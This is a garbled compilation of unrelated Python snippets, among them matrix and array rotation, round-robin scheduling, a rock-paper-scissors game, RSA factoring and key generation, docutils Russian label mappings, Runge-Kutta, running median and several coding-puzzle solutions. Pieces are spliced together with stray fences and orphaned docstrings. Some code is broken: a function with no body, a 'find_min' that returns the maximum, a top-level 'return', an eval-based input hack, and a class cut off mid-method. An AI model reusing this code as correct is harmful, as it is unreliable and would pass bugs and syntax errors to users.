    # OR.. transpose(reverse_row(matrix))


def transpose(matrix: list[list]) -> list[list]:
    matrix[:] = [list(x) for x in zip(*matrix)]
    return matrix


def reverse_row(matrix: list[list]) -> list[list]:
    matrix[:] = matrix[::-1]
    return matrix


def reverse_column(matrix: list[list]) -> list[list]:
    matrix[:] = [x[::-1] for x in matrix]
    return matrix


def print_matrix(matrix: list[list]) -> None:
    for i in matrix:
        print(*i)


if __name__ == "__main__":
    matrix = make_matrix()
    print("\norigin:\n")
    print_matrix(matrix)
    print("\nrotate 90 counterclockwise:\n")
    print_matrix(rotate_90(matrix))

    matrix = make_matrix()
    print("\norigin:\n")
    print_matrix(matrix)
    print("\nrotate 180:\n")
    print_matrix(rotate_180(matrix))

    matrix = make_matrix()
    print("\norigin:\n")
    print_matrix(matrix)
    print("\nrotate 270 counterclockwise:\n")
    print_matrix(rotate_270(matrix))

# Given a matrix of integers, we'd like to consider the sum of the elements within the area of a 45° rotated rectangle. More formally, the area is bounded by two diagonals parallel to the main diagonal and two diagonals parallel to the secondary diagonal. The dimensions of the rotated rectangle are defined by the number of elements along the borders of the rectangle.
#
# dimensions
#
# Given integers a and b representing the dimensions of the rotated rectangle, and matrix (a matrix of integers), your task is to find the greatest sum of integers contained within an a x b rotated rectangle.
#
# Note: The order of the dimensions is not important - consider all a x b and b x a rectangles.
#
# Example
#
# For
#
# matrix = [[1, 2, 3, 4, 0],
#           [5, 6, 7, 8, 1],
#           [3, 2, 4, 1, 4],
#           [4, 3, 5, 1, 6]]
# a = 2, and b = 3, the output should be rotatedRectSum(matrix, a, b) = 36.
#
# example 1
#
# For
#
# matrix = [[-2, 3, 5, -1],
#           [4, 3, -10, 10]]
# a = 1, and b = 1, the output should be rotatedRectSum(matrix, a, b) = 10.
#
# example 2
#
# The rotated rectangle with dimensions 1x1 is just one element, so the answer is the maximal element in matrix.
#
# For
#
# matrix = [[-2, 3],
#           [4, 3]]
# a = 1, and b = 2, the output should be rotatedRectSum(matrix, a, b) = 7.
#
# example 3
#
# Input/Output
#
# [execution time limit] 4 seconds (py3)
#
# [input] array.array.integer matrix
#
# A matrix of integers.
#
# Guaranteed constraints:
# 1 ≤ matrix.length, matrix[i].length ≤ 50,
# -103 ≤ matrix[i][j] ≤ 103.
#
# [input] integer a
#
# The first rotated rectangle dimension.
#
# Guaranteed constraints:
# 1 ≤ a ≤ 25.
#
# [input] integer b
#
# The second rotated rectangle dimension.
# It's guaranteed that at least one rotated rectangle will fit in the given matrix.
#
# Guaranteed constraints:
# a ≤ b ≤ 25.
#
# [output] integer
#
# The maximal sum of elements of a rotated rectangle with dimensions a and b.
def rotatedRectSum(matrix, a, b):

# Input : arr[] = {15, 18, 2, 3, 6, 12}
# Output: 2
# Explanation : Initial array must be {2, 3,
# 6, 12, 15, 18}. We get the given array after
# rotating the initial array twice.

# Input : arr[] = {7, 9, 11, 12, 5}
# Output: 4

# Input: arr[] = {7, 9, 11, 12, 15};
# Output: 0


def single_rotation(arr, l):
    temp = arr[0]
    for i in range(l - 1):
        arr[i] = arr[i + 1]
    arr[l - 1] = temp


def find_min(arr, l):
    min = arr[0]
    for i in range(l):
        if min < arr[i]:
            min = arr[i]
    minimum = min

    for i in range(l):
        if min == arr[i]:
            index = i + 1

    for i in range(index):
        single_rotation(arr, len(arr))

    return index


# def print_array(arr,l):
#     for i in range(l):
#         print(arr[i])


arr = [15, 18, 2, 3, 6, 12]
rotations = find_min(arr, len(arr))
print("number of rotations:" + str(rotations))
# print_array(arr,len(arr))
print

def sorted_find(arr, low, high, x):
    while low < high:
        mid = low + (high - low) // 2
        if arr[mid] == x:
            return mid
        elif arr[mid] >= arr[low]:
            if arr[low] > x and arr[mid] < x:
                high = mid - 1
            else:
                low = mid + 1
        elif arr[high] <= arr[mid]:
            if arr[high] > x and arr[mid] > x:
                low = mid + 1
            else:
                high = mid - 1


arr = [12, 14, 18, 21, 3, 6, 8, 9]

result = sorted_find(arr, 0, len(arr) - 1, 8)
print("element is present at index: " + str(result))

from pathlib import Path

import cv2
import numpy as np
from matplotlib import pyplot as plt


def get_rotation(
    img: np.ndarray, pt1: np.ndarray, pt2: np.ndarray, rows: int, cols: int
) -> np.ndarray:
    """
    Get image rotation
    :param img: np.array
    :param pt1: 3x2 list
    :param pt2: 3x2 list
    :param rows: columns image shape
    :param cols: rows image shape
    :return: np.array
    """
    matrix = cv2.getAffineTransform(pt1, pt2)
    return cv2.warpAffine(img, matrix, (rows, cols))


if __name__ == "__main__":
    # read original image
    image = cv2.imread(
        str(Path(__file__).resolve().parent.parent / "image_data" / "lena.jpg")
    )
    # turn image in gray scale value
    gray_img = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    # get image shape
    img_rows, img_cols = gray_img.shape

    # set different points to rotate image
    pts1 = np.array([[50, 50], [200, 50], [50, 200]], np.float32)
    pts2 = np.array([[10, 100], [200, 50], [100, 250]], np.float32)
    pts3 = np.array([[50, 50], [150, 50], [120, 200]], np.float32)
    pts4 = np.array([[10, 100], [80, 50], [180, 250]], np.float32)

    # add all rotated images in a list
    images = [
        gray_img,
        get_rotation(gray_img, pts1, pts2, img_rows, img_cols),
        get_rotation(gray_img, pts2, pts3, img_rows, img_cols),
        get_rotation(gray_img, pts2, pts4, img_rows, img_cols),
    ]

    # plot different image rotations
    fig = plt.figure(1)
    titles = ["Original", "Rotation 1", "Rotation 2", "Rotation 3"]
    for i, image in enumerate(images):
        plt.subplot(2, 2, i + 1), plt.imshow(image, "gray")
        plt.title(titles[i])
        plt.axis("off")
        plt.subplots_adjust(left=0.0, bottom=0.05, right=1.0, top=0.95)
    plt.show()

# rotation of an element by one step
def left_rotation(arr, d, n):
    for i in range(d):
        rotate_by_one_step(arr, n)


def rotate_by_one_step(arr, n):
    temp = arr[0]
    for i in range(n - 1):
        arr[i] = arr[i + 1]
    arr[n - 1] = temp


def print_array(arr, n):
    for i in range(n):
        print(arr[i])


arr = [1, 2, 3, 4, 5]

left_rotation(arr, 2, 5)

print_array(arr, 5)
````

````py
Round Robin is a scheduling algorithm.
In Round Robin each process is assigned a fixed time slot in a cyclic way.
https://en.wikipedia.org/wiki/Round-robin_scheduling```


```py
from statistics import mean
from typing import List


def calculate_waiting_times(burst_times: List[int]) -> List[int]:
    """
    Calculate the waiting times of a list of processes that have a specified duration.

    Return: The waiting time for each process.
    >>> calculate_waiting_times([10, 5, 8])
    [13, 10, 13]
    >>> calculate_waiting_times([4, 6, 3, 1])
    [5, 8, 9, 6]
    >>> calculate_waiting_times([12, 2, 10])
    [12, 2, 12]
    """
    quantum = 2
    rem_burst_times = list(burst_times)
    waiting_times = [0] * len(burst_times)
    t = 0
    while True:
        done = True
        for i, burst_time in enumerate(burst_times):
            if rem_burst_times[i] > 0:
                done = False
                if rem_burst_times[i] > quantum:
                    t += quantum
                    rem_burst_times[i] -= quantum
                else:
                    t += rem_burst_times[i]
                    waiting_times[i] = t - burst_time
                    rem_burst_times[i] = 0
        if done is True:
            return waiting_times


def calculate_turn_around_times(
    burst_times: List[int], waiting_times: List[int]
) -> List[int]:
    """
    >>> calculate_turn_around_times([1, 2, 3, 4], [0, 1, 3])
    [1, 3, 6]
    >>> calculate_turn_around_times([10, 3, 7], [10, 6, 11])
    [20, 9, 18]
    """
    return [burst + waiting for burst, waiting in zip(burst_times, waiting_times)]


if __name__ == "__main__":
    burst_times = [3, 5, 7]
    waiting_times = calculate_waiting_times(burst_times)
    turn_around_times = calculate_turn_around_times(burst_times, waiting_times)
    print("Process ID \tBurst Time \tWaiting Time \tTurnaround Time")
    for i, burst_time in enumerate(burst_times):
        print(
            f"  {i + 1}\t\t  {burst_time}\t\t  {waiting_times[i]}\t\t  "
            f"{turn_around_times[i]}"
        )
    print(f"\nAverage waiting time = {mean(waiting_times):.5f}")
    print(f"Average turn around time = {mean(turn_around_times):.5f}")

# Round Robin scheduling

# ----To calculate waiting time----
def findWaitingTime(processes, n, bt, wt, quantum):
    rem_bt = [0] * n

    for i in range(n):
        rem_bt[i] = bt[i]  # Copy the burst time into rt[]
    t = 0  # present time

    # ---traversing processes continues in robin manner until all of them are not done---
    while 1:
        done = True

        # ---Traverse all processes one by one repeatedly---
        for i in range(n):

            if (
                rem_bt[i] > 0
            ):  # If burst time of a process is greater than 0 then only need to process further
                done = False  # There is a pending process

                if rem_bt[i] > quantum:

                    t += (
                        quantum
                    )  # Increase the value of t i.e. shows how much time a process has been processed

                    rem_bt[
                        i
                    ] -= (
                        quantum
                    )  # Decrease the burst_time of current process by quantum
                # ---If burst time is smaller than or equal to quantum. Last cycle for this process---
                else:
                    t = (
                        t + rem_bt[i]
                    )  # Increase the value of t i.e. shows how much time a process has been processed

                    wt[i] = (
                        t - bt[i]
                    )  # Waiting time is current time minus time used by this process

                    rem_bt[
                        i
                    ] = (
                        0
                    )  # As the process gets fully executed make its remaining burst time = 0

        # ---If all processes are accomplished---
        if done == True:
            break


# ---calculation of turn around time---
def findTurnAroundTime(processes, n, bt, wt, tat):

    for i in range(n):
        tat[i] = bt[i] + wt[i]  # Calculating turnaround time


# ---calculating average waiting and turn-around times---
def findavgTime(processes, n, bt, quantum):
    wt = [0] * n
    tat = [0] * n

    # ---Calculating waiting time for all processes---
    findWaitingTime(processes, n, bt, wt, quantum)

    # ---Calculating turn around time for all processes---
    findTurnAroundTime(processes, n, bt, wt, tat)

    # ---Display processes along with all details---
    print("Processes Burst Time  Waiting", "Time Turn-Around Time")
    total_wt = 0
    total_tat = 0
    for i in range(n):

        total_wt = total_wt + wt[i]
        total_tat = total_tat + tat[i]
        print(" ", i + 1, "\t\t", bt[i], "\t\t", wt[i], "\t\t", tat[i])

    print("\nAverage waiting time = %.5f " % (total_wt / n))
    print("Average turn around time = %.5f " % (total_tat / n))


if __name__ == "__main__":
    proc = [1, 2, 3]
    n = 3
    burst_time = [7, 3, 11]
    quantum = 2
    findavgTime(proc, n, burst_time, quantum)

import random

# Create a rock/paper/scissors REPL loop
# Have a computer AI to play against us
# Keep track of the score
# Rules: r beats s, s beats p, p beats r

wins = 0
losses = 0
ties = 0
choices = ['r', 'p', 's']

# write a REPL to run the game
import random

rolls = {
    "rock": {"defeats": ["scissors"], "defeated_by": ["paper"]},
    "paper": {"defeats": ["rock"], "defeated_by": ["scissors"]},
    "scissors": {"defeats": ["paper"], "defeated_by": ["rock"]},
}


def main():
    show_header()
    play_game("You", "Computer")


def show_header():
    print("---------------------------")
    print("   Rock Paper Scissors")
    print(" Data Structures Edition")
    print("---------------------------")


def play_game(player_1, player_2):
    wins = {player_1: 0, player_2: 0}
    roll_names = list(rolls.keys())

    while not find_winner(wins, wins.keys()):
        roll1 = get_roll(player_1, roll_names)
        roll2 = random.choice(roll_names)

        if not roll1:
            print("Try again!")
            continue

        print(f"{player_1} roll {roll1}")
        print(f"{player_2} rolls {roll2}")

        winner = check_for_winning_throw(player_1, player_2, roll1, roll2)

        if winner is None:
            print("This round was a tie!")
        else:
            print(f"{winner} takes the round!")
            wins[winner] += 1

        # print(f"Current win status: {wins}")

        print(
            f"Score is {player_1}: {wins[player_1]} and {player_2}: {wins[player_2]}."
        )
        print()

    overall_winner = find_winner(wins, wins.keys())
    print(f"{overall_winner} wins the game!")


def find_winner(wins, names):
    best_of = 3
    for name in names:
        if wins.get(name, 0) >= best_of:
            return name

    return None


def check_for_winning_throw(player_1, player_2, roll1, roll2):
    winner = None
    if roll1 == roll2:
        print("The play was tied!")

    outcome = rolls.get(roll1, {})
    if roll2 in outcome.get("defeats"):
        return player_1
    elif roll2 in outcome.get("defeated_by"):
        return player_2

    return winner


def get_roll(player_name, roll_names):
    print("Available rolls:")
    for index, r in enumerate(roll_names, start=1):
        print(f"{index}. {r}")

    text = input(f"{player_name}, what is your roll? ")
    selected_index = int(text) - 1

    if selected_index < 0 or selected_index >= len(rolls):
        print(f"Sorry {player_name}, {text} is out of bounds!")
        return None

    return roll_names[selected_index]


if __name__ == "__main__":
    main()
````

````py
    pygments.styles.rrt
    ~~~~~~~~~~~~~~~~~~~

    pygments "rrt" theme, based on Zap and Emacs defaults.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import Comment, Name, Keyword, String


class RrtStyle(Style):
    """
    Minimalistic "rrt" theme, based on Zap and Emacs defaults.
    """

    background_color = '#000000'
    highlight_color = '#0000ff'

    styles = {
        Comment:            '#00ff00',
        Name.Function:      '#ffff00',
        Name.Variable:      '#eedd82',
        Name.Constant:      '#7fffd4',
        Keyword:            '#ff0000',
        Comment.Preproc:    '#e5e5e5',
        String:             '#87ceeb',
        Keyword.Type:       '#ee82ee',
    }
````

````py
An RSA prime factor algorithm.

The program can efficiently factor RSA prime number given the private key d and
public key e.
Source: on page 3 of https://crypto.stanford.edu/~dabo/papers/RSA-survey.pdf
More readable source: https://www.di-mgt.com.au/rsa_factorize_n.html
large number can take minutes to factor, therefore are not included in doctest.```


```py
from __future__ import annotations

import math
import random


def rsafactor(d: int, e: int, N: int) -> list[int]:
    """
    This function returns the factors of N, where p*q=N
      Return: [p, q]

    We call N the RSA modulus, e the encryption exponent, and d the decryption exponent.
    The pair (N, e) is the public key. As its name suggests, it is public and is used to
        encrypt messages.
    The pair (N, d) is the secret key or private key and is known only to the recipient
        of encrypted messages.

    >>> rsafactor(3, 16971, 25777)
    [149, 173]
    >>> rsafactor(7331, 11, 27233)
    [113, 241]
    >>> rsafactor(4021, 13, 17711)
    [89, 199]
    """
    k = d * e - 1
    p = 0
    q = 0
    while p == 0:
        g = random.randint(2, N - 1)
        t = k
        while True:
            if t % 2 == 0:
                t = t // 2
                x = (g ** t) % N
                y = math.gcd(x - 1, N)
                if x > 1 and y > 1:
                    p = y
                    q = N // y
                    break  # find the correct factors
            else:
                break  # t is not divisible by 2, break and choose another g
    return sorted([p, q])


if __name__ == "__main__":
    import doctest

    doctest.testmod()

from __future__ import print_function
import random, sys, os
import rabin_miller as rabinMiller, cryptomath_module as cryptoMath

def main():
    print('Making key files...')
    makeKeyFiles('rsa', 1024)
    print('Key files generation successful.')

def generateKey(keySize):
    print('Generating prime p...')
    p = rabinMiller.generateLargePrime(keySize)
    print('Generating prime q...')
    q = rabinMiller.generateLargePrime(keySize)
    n = p * q

    print('Generating e that is relatively prime to (p - 1) * (q - 1)...')
    while True:
        e = random.randrange(2 ** (keySize - 1), 2 ** (keySize))
        if cryptoMath.gcd(e, (p - 1) * (q - 1)) == 1:
            break

    print('Calculating d that is mod inverse of e...')
    d = cryptoMath.findModInverse(e, (p - 1) * (q - 1))

    publicKey = (n, e)
    privateKey = (n, d)
    return (publicKey, privateKey)

def makeKeyFiles(name, keySize):
    if os.path.exists('%s_pubkey.txt' % (name)) or os.path.exists('%s_privkey.txt' % (name)):
        print('\nWARNING:')
        print('"%s_pubkey.txt" or "%s_privkey.txt" already exists. \nUse a different name or delete these files and re-run this program.' % (name, name))
        sys.exit()

    publicKey, privateKey = generateKey(keySize)
    print('\nWriting public key to file %s_pubkey.txt...' % name)
    with open('%s_pubkey.txt' % name, 'w') as fo:
        fo.write('%s,%s,%s' % (keySize, publicKey[0], publicKey[1]))

    print('Writing private key to file %s_privkey.txt...' % name)
    with open('%s_privkey.txt' % name, 'w') as fo:
        fo.write('%s,%s,%s' % (keySize, privateKey[0], privateKey[1]))

if __name__ == '__main__':
    main()
````

```pyreStructuredText Exporter class"""

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

from traitlets import default
from traitlets.config import Config

from .templateexporter import TemplateExporter


class RSTExporter(TemplateExporter):
    """
    Exports reStructuredText documents.
    """

    @default('file_extension')
    def _file_extension_default(self):
        return '.rst'

    @default('template_name')
    def _template_name_default(self):
        return 'rst'

    output_mimetype = 'text/restructuredtext'
    export_from_notebook = "reST"

    @property
    def default_config(self):
        c = Config({
            'ExtractOutputPreprocessor':{
                'enabled':True
                },
            'HighlightMagicsPreprocessor': {
                'enabled':True
                },
            })
        c.merge(super().default_config)
        return c

#!/usr/bin/env python
```

````py
rst2md.py
======

This module provides a simple command line interface that uses the
Markdown writer to output from reStructuredText source.

From: https://github.com/cgwrench/rst2md```


```py

import locale

try:
    locale.setlocale(locale.LC_ALL, "")
except:
    pass

from docutils.core import publish_cmdline, default_description

try:
    from docutils.writers import markdown
except ImportError:
    # Obviously still just testing this package (i.e. have not installed it)
    # Remove this try-except from the final release version.
    import sys
    import os

    sys.path.insert(0, os.path.abspath("."))
    import markdown

description = (
    "Generates Markdown formatted text from standalone "
    "reStructuredText sources.  " + default_description
)

publish_cmdline(writer=markdown.Writer(), description=description)

# -*- coding: utf-8 -*-
# $Id: ru.py 7125 2011-09-16 18:36:18Z milde $
# Author: Roman Suzi <rnd@onego.ru>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
Russian-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = 'reStructuredText'

labels = {
      u'abstract': u'Аннотация',
      u'address': u'Адрес',
      u'attention': u'Внимание!',
      u'author': u'Автор',
      u'authors': u'Авторы',
      u'caution': u'Осторожно!',
      u'contact': u'Контакт',
      u'contents': u'Содержание',
      u'copyright': u'Права копирования',
      u'danger': u'ОПАСНО!',
      u'date': u'Дата',
      u'dedication': u'Посвящение',
      u'error': u'Ошибка',
      u'hint': u'Совет',
      u'important': u'Важно',
      u'note': u'Примечание',
      u'organization': u'Организация',
      u'revision': u'Редакция',
      u'status': u'Статус',
      u'tip': u'Подсказка',
      u'version': u'Версия',
      u'warning': u'Предупреждение'}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
      u'аннотация': u'abstract',
      u'адрес': u'address',
      u'автор': u'author',
      u'авторы': u'authors',
      u'контакт': u'contact',
      u'права копирования': u'copyright',
      u'дата': u'date',
      u'посвящение': u'dedication',
      u'организация': u'organization',
      u'редакция': u'revision',
      u'статус': u'status',
      u'версия': u'version'}```


```pyRussian (lowcased) to canonical name mapping for bibliographic fields."""

author_separators =  [';', ',']```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""

from market import app

#Checks if the run.py file has executed directly and not imported
if __name__ == '__main__':
    app.run(debug=True)
import numpy as np


def runge_kutta(f, y0, x0, h, x_end):
    """
    Calculate the numeric solution at each step to the ODE f(x, y) using RK4

    https://en.wikipedia.org/wiki/Runge-Kutta_methods

    Arguments:
    f -- The ode as a function of x and y
    y0 -- the initial value for y
    x0 -- the initial value for x
    h -- the stepsize
    x_end -- the end value for x

    >>> # the exact solution is math.exp(x)
    >>> def f(x, y):
    ...     return y
    >>> y0 = 1
    >>> y = runge_kutta(f, y0, 0.0, 0.01, 5)
    >>> y[-1]
    148.41315904125113
    """
    N = int(np.ceil((x_end - x0) / h))
    y = np.zeros((N + 1,))
    y[0] = y0
    x = x0

    for k in range(N):
        k1 = f(x, y[k])
        k2 = f(x + 0.5 * h, y[k] + 0.5 * h * k1)
        k3 = f(x + 0.5 * h, y[k] + 0.5 * h * k2)
        k4 = f(x + h, y[k] + h * k3)
        y[k + 1] = y[k] + (1 / 6) * h * (k1 + 2 * k2 + 2 * k3 + k4)
        x += h

    return y


if __name__ == "__main__":
    import doctest

    doctest.testmod()

p, s = eval(dir()[0])
r = -1
l = len(p)
for i in range(l):
    for j in range(l):
        c = 0
        d = p[j] - p[i]
        f = s[i] - s[j]

        if d * f < 1:
            continue

        for k in range(l):
            if p[k] * f + s[k] * d == p[i] * f + s[i] * d:
                c += 1
        if c > r:
            r = c
return r

import copy


def runningWater(cap, volume):
    max_buckets = cap[::]
    full_volume = sum(max_buckets)
    seen_volume = set()
    seen = set()
    stack = emptyBuckets(cap, 0, volume)
    for item in stack:
        seen_volume.add(full_volume - item[0])
        seen.add(tuple(item[1]))

    # need this edge case here to pass all tests!
    if volume == full_volume:
        return True

    while stack and volume not in seen_volume:
        curr = stack.pop()
        seen_volume.add(full_volume - curr[0])
        seen.add(tuple(curr[1]))
        # add values for emptied bucket move
        # only if tuples not in seen
        for item in emptyBuckets(curr[1], curr[0], volume):
            if tuple(item[1]) not in seen:
                stack.append(item)
                seen.add(tuple(item[1]))

        # add values for combinations of pouring buckets into other buckets
        # stack.extend([a for a in pourBuckets(curr, max_buckets) if tuple(a[1]) not in seen])
        for item in pourBuckets(curr, max_buckets, seen):
            # if(tuple(item[1]) not in seen):
            stack.append(item)
            seen.add(tuple(item[1]))

    else:
        if volume in seen_volume:
            return True

    return False


def emptyBuckets(buckets, curr_poured, min_volume):
    output = []
    for i in range(3):
        output.append([buckets[i] + curr_poured, []])
        # print(output)
        for j in range(3):
            if j == i:
                output[i][1].append(0)
            else:
                output[i][1].append(buckets[j])
    # print(output)
    for i in range(3):
        if min_volume > sum(output[-1][1]):
            # print(min_volume, output[-1][1])
            # print(output)
            output.pop()
    return output


def pourBuckets(buckets, max_buckets, seen):
    output = []
    # print(buckets)
    for i in range(3):
        for j in range(3):
            if i == j:
                continue
            curr = copy.deepcopy(buckets)
            # pour buckets into other buckets
            if curr[1][j] == max_buckets[j]:
                # bucket to be poured into is full
                # print(buckets, max_buckets)
                # output.append(curr)
                continue
            elif curr[1][i] + curr[1][j] >= max_buckets[j]:
                curr[1][i] = (curr[1][j] + curr[1][i]) - max_buckets[j]
                curr[1][j] = max_buckets[j]
                # print(i, j, buckets, curr)
            # output.append(curr)
            elif curr[1][i] + curr[1][j] < max_buckets[j]:
                curr[1][j] = curr[1][i] + curr[1][j]
                curr[1][i] = 0
            if tuple(curr[1]) not in seen:
                output.append(copy.deepcopy(curr))
    # print(buckets, output)
    return output
````

````py
Running Median

Compute the running median of a sequence of numbers.
That is, given a stream of numbers, print out the median of the list so far on each new element.
Recall that the median of an even-numbered list is the average of the two middle numbers.

Input: [2, 1, 5, 7, 2, 0, 5]
Output:
2
1.5
2
3.5
2
2
2

=========================================
Using 2 heaps (max and min Priority Queues) balance the left and right side of the stream.
    Time Complexity:    O(N LogN)
    Space Complexity:   O(N)```


```py


############
# Solution #
############

import heapq


class PriorityQueue:
    def __init__(self, is_min=True):
        self.data = []
        self.is_min = is_min

    def push(self, el):
        if not self.is_min:
            el = -el
        heapq.heappush(self.data, el)

    def pop(self):
        el = heapq.heappop(self.data)
        if not self.is_min:
            el = -el
        return el

    def peek(self):
        el = self.data[0]
        if not self.is_min:
            el = -el
        return el

    def count(self):
        return len(self.data)


def running_median(stream):
    left_heap = PriorityQueue(False)  # Max Priority Queue
    right_heap = PriorityQueue()  # Min Priority Queue

    # left_heap will have always same number of elements or 1 element more than right_heap
    for number in stream:
        if left_heap.count() == 0:
            # enters here only for the first element of the streen
            left_heap.push(number)
        # balance the heaps
        elif left_heap.count() > right_heap.count():
            # in this case the right_heap should get a new element (so both heaps will have same number of elements)
            if left_heap.peek() > number:
                # move an element from left to right heap
                right_heap.push(left_heap.pop())
                left_heap.push(number)
            else:
                right_heap.push(number)
        else:
            # in this case the left_heap should get a new element (so the left_heap will have 1 more element)
            if right_heap.peek() < number:
                # move an element from right to left heap
                left_heap.push(right_heap.pop())
                right_heap.push(number)
            else:
                left_heap.push(number)

        if left_heap.count() > right_heap.count():
            # if left_heap is bigger then odd elements from the stream are processed
            # because left_heap is bigger ONLY BY 1 element from right_heap (n + n + 1 = 2n + 1)
            print(left_heap.peek())
        else:
            # both heaps have same length, so the count from the elements is even (n + n = 2n)
            print((left_heap.peek() + right_heap.peek()) / 2)


###########
# Testing #
###########

# Test 1
# Correct result => 2 1.5 2 3.5 2 2 2
running_median([2, 1, 5, 7, 2, 0, 5])

#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ----------------------------------------------------------------------------
# Copyright © 2015- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# ----------------------------------------------------------------------------
````

```pyFile for running tests programmatically."""

# Standard library imports
import sys

# Third party imports
import qtpy  # to ensure that Qt4 uses API v2
import pytest


def main():
    """Run pytest tests."""
    errno = pytest.main(['-x', 'qtpy',  '-v', '-rw', '--durations=10',
                         '--cov=qtpy', '--cov-report=term-missing'])
    sys.exit(errno)

if __name__ == '__main__':
    main()
```

````pyBase classes and function for readers and writers.

Authors:

* Brian Granger```


```py

#-----------------------------------------------------------------------------
#  Copyright (C) 2008-2011  The IPython Development Team
#
#  Distributed under the terms of the BSD License.  The full license is in
#  the file COPYING, distributed as part of this software.
#-----------------------------------------------------------------------------

#-----------------------------------------------------------------------------
# Imports
#-----------------------------------------------------------------------------

#-----------------------------------------------------------------------------
# Code
#-----------------------------------------------------------------------------

class NotebookReader(object):

    def reads(self, s, **kwargs):
        """Read a notebook from a string."""
        raise NotImplementedError("loads must be implemented in a subclass")

    def read(self, fp, **kwargs):
        """Read a notebook from a file like object"""
        return self.reads(fp.read(), **kwargs)


class NotebookWriter(object):

    def writes(self, nb, **kwargs):
        """Write a notebook to a string."""
        raise NotImplementedError("loads must be implemented in a subclass")

    def write(self, nb, fp, **kwargs):
        """Write a notebook to a file like object"""
        return fp.write(self.writes(nb,**kwargs))




def swap_case(s):
    return s.swapcase()

if __name__ == '__main__':
    s = input()
    result = swap_case(s)
    print(result)```


```py
Safe Squares from Rooks

On a generalized n-by-n chessboard, there are some number of rooks, each rook represented as a
two-tuple (row, column) of the row and the column that it is in. (The rows and columns are
numbered from 0 to n-1.) A chess rook covers all squares that are in the same row or in the same
column as that rook. Given the board size n and the list of rooks on that board, count the number of
empty squares that are safe, that is, are not covered by any rook.

Input: [(1, 1), (3, 5), (7, 0), (7, 6)], 8
Output: 20

=========================================
The result is a multiplication between free rows and free columns.
Use hashsets to store the free rows and columns.
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############


def safe_squares_rooks(rooks, n):
    rows = set()
    cols = set()

    for i in range(n):
        rows.add(i)
        cols.add(i)

    for rook in rooks:
        if rook[0] in rows:
            rows.remove(rook[0])
        if rook[1] in cols:
            cols.remove(rook[1])

    return len(rows) * len(cols)


###########
# Testsing #
###########

# safe_squares_rooks 1
# Correct result => 1
print(safe_squares_rooks([(1, 1)], 2))

# safe_squares_rooks 2
# Correct result => 4
print(safe_squares_rooks([(2, 3), (0, 1)], 4))

# safe_squares_rooks 3
# Correct result => 20
print(safe_squares_rooks([(1, 1), (3, 5), (7, 0), (7, 6)], 8))

# safe_squares_rooks 4
# Correct result => 0
print(safe_squares_rooks([(0, 0), (1, 1), (2, 2), (3, 3), (4, 4), (5, 5)], 6))

import py
import sys

builtin_repr = repr

reprlib = py.builtin._tryimport('repr', 'reprlib')

class SafeRepr(reprlib.Repr):
    """ subclass of repr.Repr that limits the resulting size of repr()
        and includes information on exceptions raised during the call.
    """
    def repr(self, x):
        return self._callhelper(reprlib.Repr.repr, self, x)

    def repr_unicode(self, x, level):
        # Strictly speaking wrong on narrow builds
        def repr(u):
            if "'" not in u:
                return py.builtin._totext("'%s'") % u
            elif '"' not in u:
                return py.builtin._totext('"%s"') % u
            else:
                return py.builtin._totext("'%s'") % u.replace("'", r"\'")
        s = repr(x[:self.maxstring])
        if len(s) > self.maxstring:
            i = max(0, (self.maxstring-3)//2)
            j = max(0, self.maxstring-3-i)
            s = repr(x[:i] + x[len(x)-j:])
            s = s[:i] + '...' + s[len(s)-j:]
        return s

    def repr_instance(self, x, level):
        return self._callhelper(builtin_repr, x)

    def _callhelper(self, call, x, *args):
        try:
            # Try the vanilla repr and make sure that the result is a string
            s = call(x, *args)
        except py.builtin._sysex:
            raise
        except:
            cls, e, tb = sys.exc_info()
            exc_name = getattr(cls, '__name__', 'unknown')
            try:
                exc_info = str(e)
            except py.builtin._sysex:
                raise
            except:
                exc_info = 'unknown'
            return '<[%s("%s") raised in repr()] %s object at 0x%x>' % (
                exc_name, exc_info, x.__class__.__name__, id(x))
        else:
            if len(s) > self.maxsize:
                i = max(0, (self.maxsize-3)//2)
                j = max(0, self.maxsize-3-i)
                s = s[:i] + '...' + s[len(s)-j:]
            return s

def saferepr(obj, maxsize=240):
    """ return a size-limited safe repr-string for the given object.
    Failing __repr__ functions of user instances will be represented
    with a short exception info and 'saferepr' generally takes
    care to never raise exceptions itself.  This function is a wrapper
    around the Repr/reprlib functionality of the standard 2.6 lib.
    """
    # review exception handling
    srepr = SafeRepr()
    srepr.maxstring = maxsize
    srepr.maxsize = maxsize
    srepr.maxother = 160
    return srepr.repr(obj)

# Complete the sockMerchant function below.
def sockMerchant(n, arr):
    dictonary = {}
    counter = 0
    for i in arr:
        if i in dictonary:
            dictonary[i] += 1
        else:
            dictonary[i] = 1
    for pred in dictonary.values():
        if pred % 2 != 0:
            counter += 1

    return counter


arr = [10, 20, 20, 10, 10, 30, 50, 10, 20]
print(sockMerchant(len(arr), arr))

# Given two binary trees, write a function to check if they are the same or not.
#
# Two binary trees are considered the same if they are structurally identical and the nodes have the same value.
#
# Example 1:
#
# Input:     1         1
#           / \       / \
#          2   3     2   3
#
#         [1,2,3],   [1,2,3]
#
# Output: true
# Example 2:
#
# Input:     1         1
#           /           \
#          2             2
#
#         [1,2],     [1,null,2]
#
# Output: false
# Example 3:
#
# Input:     1         1
#           / \       / \
#          2   1     1   2
#
#         [1,2,1],   [1,1,2]
#
# Output: false

import collections


class Solution:
    def isSameTree(self, p, q):

        queue = collections.deque()
        queue.append([p, q])

        while len(queue):
            node1, node2 = queue.popleft()

            if not node1 and not node2:
                continue

            if not node1 or not node2:
                return node1 == node2

            if node1.val != node2.val:
                return False

            queue.append([node1.left, node2.left])
            queue.append([node1.right, node2.right])

        return True

from collections import namedtuple


class Timestamp(object):
    """A nanosecond-resolution timestamp."""

    def __init__(self, sec, nsec):
        if nsec < 0 or nsec >= 1e9:
